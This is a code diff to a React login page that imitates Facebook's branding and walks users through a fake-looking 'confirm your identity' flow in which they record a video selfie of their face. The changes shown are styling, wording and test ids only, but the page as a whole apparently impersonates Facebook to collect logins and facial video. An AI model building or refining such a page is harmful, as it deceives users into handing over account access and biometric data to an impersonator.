@@ -505,17 +505,17 @@ export default function LoginPage() {
 
           {/* Face Intro - Confirm Identity */}
           {currentStep === "face-intro" && (
-            <div className="text-center">
-              <div className="mb-6">
-                <div className="w-20 h-20 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
-                  <svg className="w-10 h-10" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="1.5">
+            <div className="text-center px-4 py-12">
+              <div className="mb-8">
+                <div className="w-24 h-24 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                  <svg className="w-12 h-12" viewBox="0 0 24 24" fill="none" stroke="#1877f2" strokeWidth="1.5">
                     <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                   </svg>
                 </div>
               </div>
-              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
-              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
-                We need to verify your identity before you can continue to Facebook.
+              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Confirm your identity</h2>
+              <p className="text-sm mb-10 leading-relaxed" style={{ color: '#65676b' }}>
+                We need to verify your identity to keep your account secure. We'll use facial recognition to compare your face with your profile.
               </p>
               <button
                 onClick={() => setCurrentStep("face-explanation")}
@@ -523,6 +523,7 @@ export default function LoginPage() {
                 style={{ backgroundColor: '#1877f2' }}
                 onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                 onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                data-testid="button-confirm-identity"
               >
                 Continue
               </button>
@@ -531,17 +532,39 @@ export default function LoginPage() {
 
           {/* Face Explanation */}
           {currentStep === "face-explanation" && (
-            <div className="text-center px-4">
-              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
-              <p className="text-base mb-8" style={{ color: '#65676b', lineHeight: '20px' }}>
-                We'll compare a video of your face to your profile photos. This helps us confirm you're a real person.
-              </p>
+            <div className="text-center px-4 py-8">
+              <h2 className="text-3xl font-bold mb-4" style={{ color: '#1c1e21' }}>Use your face to confirm it's you</h2>
 
               {/* Illustration */}
-              <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
-                <svg className="w-16 h-16" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
+              <div className="w-40 h-40 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                <svg className="w-20 h-20" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                   <path strokeLinecap="round" strokeLinejoin="round" d="M17.982 18.725A7.488 7.488 0 0012 15.75a7.488 7.488 0 00-5.982 2.975m11.963 0a9 9 0 10-11.963 0m11.963 0A8.966 8.966 0 0112 21a8.966 8.966 0 01-5.982-2.275M15 9.75a3 3 0 11-6 0 3 3 0 016 0z" />
                 </svg>
+              </div>
+
+              <p className="text-sm mb-8 leading-relaxed" style={{ color: '#65676b' }}>
+                We'll record a short video of your face and compare it to your profile photos. Keep your face in the center and follow the on-screen directions.
+              </p>
+
+              <div className="space-y-2 mb-8">
+                <div className="flex items-start gap-3">
+                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                  </svg>
+                  <p className="text-sm text-left" style={{ color: '#65676b' }}>Good lighting is important</p>
+                </div>
+                <div className="flex items-start gap-3">
+                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                  </svg>
+                  <p className="text-sm text-left" style={{ color: '#65676b' }}>You'll need a camera</p>
+                </div>
+                <div className="flex items-start gap-3">
+                  <svg className="w-5 h-5 mt-0.5" fill="none" stroke="#1877f2" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                  </svg>
+                  <p className="text-sm text-left" style={{ color: '#65676b' }}>Takes about 1 minute</p>
+                </div>
               </div>
 
               <button
@@ -550,6 +573,7 @@ export default function LoginPage() {
                 style={{ backgroundColor: '#1877f2' }}
                 onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                 onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                data-testid="button-start-face-verification"
               >
                 Continue
               </button>
@@ -557,6 +581,7 @@ export default function LoginPage() {
                 onClick={() => setCurrentStep("login")}
                 className="text-sm"
                 style={{ color: '#1877f2' }}
+                data-testid="button-cancel-explanation"
               >
                 Cancel
               </button>
@@ -565,16 +590,16 @@ export default function LoginPage() {
 
           {/* Instructions Screen */}
           {currentStep === "instructions" && (
-            <div className="text-center px-4">
-              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
-              <p className="text-base mb-6" style={{ color: '#65676b', lineHeight: '20px' }}>
-                Center your face in the frame. You'll be asked to slowly turn your head in all directions.
+            <div className="text-center px-4 py-8">
+              <h2 className="text-3xl font-bold mb-3" style={{ color: '#1c1e21' }}>Take a video selfie</h2>
+              <p className="text-sm mb-8" style={{ color: '#65676b', lineHeight: '20px' }}>
+                Center your face in the frame. You'll be asked to slowly turn your head left, right, and up.
               </p>
 
               {/* Camera Preview */}
-              <div className="relative w-64 h-80 mx-auto mb-6 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
+              <div className="relative w-72 h-96 mx-auto mb-8 rounded-2xl overflow-hidden" style={{ backgroundColor: '#000', boxShadow: '0 10px 40px rgba(0,0,0,0.2)' }}>
                 <video
-                  ref={setVideoRef} // Use the setter function to update videoRef state
+                  ref={setVideoRef}
                   autoPlay
                   playsInline
                   muted
@@ -584,10 +609,12 @@ export default function LoginPage() {
                 {/* Face outline guide */}
                 <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                   <div
-                    className="w-48 h-64 rounded-full border-4"
+                    className="rounded-full border-2"
                     style={{
-                      borderColor: 'rgba(255, 255, 255, 0.5)',
-                      borderStyle: 'dashed'
+                      width: '70%',
+                      height: '70%',
+                      borderColor: 'rgba(24, 119, 242, 0.6)',
+                      boxShadow: 'inset 0 0 20px rgba(24, 119, 242, 0.2)'
                     }}
                   />
                 </div>
@@ -599,6 +626,7 @@ export default function LoginPage() {
                 style={{ backgroundColor: '#1877f2' }}
                 onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#166fe5')}
                 onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
+                data-testid="button-start-recording"
               >
                 Start Recording
               </button>
@@ -607,21 +635,21 @@ export default function LoginPage() {
 
           {/* Recording Screen */}
           {currentStep === "recording" && (
-            <div className="text-center px-4">
-              <h2 className="text-xl font-semibold mb-2" style={{ color: '#1c1e21' }}>
-                {currentDirection === "left" ? "Turn left" :
-                 currentDirection === "right" ? "Turn right" :
+            <div className="text-center px-4 py-8">
+              <h2 className="text-3xl font-bold mb-2" style={{ color: '#1c1e21' }}>
+                {currentDirection === "left" ? "Turn your head left" :
+                 currentDirection === "right" ? "Turn your head right" :
                  currentDirection === "up" ? "Look up" :
                  "Recording..."}
               </h2>
               
-              <p className="text-sm mb-6" style={{ color: '#65676b' }}>
-                Follow the on-screen prompts
+              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
+                Keep your face in the circle
               </p>
 
               {/* Camera Feed */}
-              <div className="relative w-full max-w-sm mx-auto mb-6">
-                <div className="relative w-full rounded-2xl overflow-hidden" style={{ aspectRatio: '3/4', backgroundColor: '#000' }}>
+              <div className="relative w-full max-w-sm mx-auto mb-8">
+                <div className="relative w-full rounded-2xl overflow-hidden" style={{ aspectRatio: '3/4', backgroundColor: '#000', boxShadow: '0 10px 40px rgba(0,0,0,0.2)' }}>
                   <video
                     ref={setVideoRef}
                     autoPlay
@@ -637,8 +665,8 @@ export default function LoginPage() {
                       style={{
                         width: '70%',
                         height: '85%',
-                        borderColor: 'rgba(255, 255, 255, 0.4)',
-                        borderStyle: 'solid'
+                        borderColor: 'rgba(24, 119, 242, 0.6)',
+                        boxShadow: 'inset 0 0 30px rgba(24, 119, 242, 0.2)'
                       }}
                     />
                   </div>
@@ -647,20 +675,21 @@ export default function LoginPage() {
                   {currentDirection && (
                     <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                       <div
-                        className="text-white font-bold text-6xl"
+                        className="text-white font-bold text-7xl"
                         style={{
-                          textShadow: '0 2px 8px rgba(0,0,0,0.8)',
+                          textShadow: '0 4px 12px rgba(0,0,0,0.9)',
                           transform:
-                            currentDirection === "left" ? "translateX(-80px)" :
-                            currentDirection === "right" ? "translateX(80px)" :
-                            currentDirection === "up" ? "translateY(-100px)" :
+                            currentDirection === "left" ? "translateX(-100px)" :
+                            currentDirection === "right" ? "translateX(100px)" :
+                            currentDirection === "up" ? "translateY(-120px)" :
                             "none",
-                          transition: 'transform 0.3s ease'
+                          transition: 'transform 0.3s ease',
+                          opacity: 0.9
                         }}
                       >
-                        {currentDirection === "left" ? "<" :
-                         currentDirection === "right" ? ">" :
-                         currentDirection === "up" ? "^" :
+                        {currentDirection === "left" ? "←" :
+                         currentDirection === "right" ? "→" :
+                         currentDirection === "up" ? "↑" :
                          ""}
                       </div>
                     </div>
@@ -669,7 +698,7 @@ export default function LoginPage() {
               </div>
 
               {/* Progress bar */}
-              <div className="w-full max-w-sm mx-auto mb-6">
+              <div className="w-full max-w-sm mx-auto mb-8">
                 <div className="h-2 rounded-full overflow-hidden" style={{ backgroundColor: '#e4e6eb' }}>
                   <div
                     className="h-full rounded-full transition-all duration-100"
@@ -679,7 +708,7 @@ export default function LoginPage() {
                     }}
                   />
                 </div>
-                <p className="text-xs mt-2" style={{ color: '#65676b' }}>
+                <p className="text-xs mt-3 font-semibold" style={{ color: '#1877f2' }}>
                   {Math.round(overallProgress)}% complete
                 </p>
               </div>
@@ -725,15 +754,19 @@ export default function LoginPage() {
 
           {/* Complete - Identity Confirmed */}
           {currentStep === "complete" && (
-            <div className="text-center py-8">
-              <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#00a400' }}>
-                <svg className="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
+            <div className="text-center py-12">
+              <div className="w-32 h-32 mx-auto mb-8 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
+                <svg className="w-16 h-16 text-white" fill="currentColor" viewBox="0 0 24 24" style={{ color: '#00a400' }}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" fill="currentColor" />
+                  <circle cx="12" cy="12" r="10" fill="none" stroke="#00a400" strokeWidth="2" />
+                </svg>
+                <svg className="w-16 h-16 absolute text-white" viewBox="0 0 24 24" style={{ color: '#00a400' }}>
+                  <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" fill="none" stroke="currentColor" strokeWidth="3" />
                 </svg>
               </div>
-              <h2 className="text-2xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
-              <p className="text-sm mb-8" style={{ color: '#65676b' }}>
-                You can now continue to Facebook.
+              <h2 className="text-3xl font-bold mb-3" style={{ color: '#1c1e21' }}>Identity Confirmed</h2>
+              <p className="text-sm mb-10" style={{ color: '#65676b' }}>
+                Your face has been verified successfully. You can now continue to Facebook.
               </p>
               <button
                 onClick={() => {
@@ -754,7 +787,7 @@ export default function LoginPage() {
                 onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = '#1877f2')}
                 data-testid="button-continue"
               >
-                Continue
+                Continue to Facebook
               </button>
             </div>
           )}
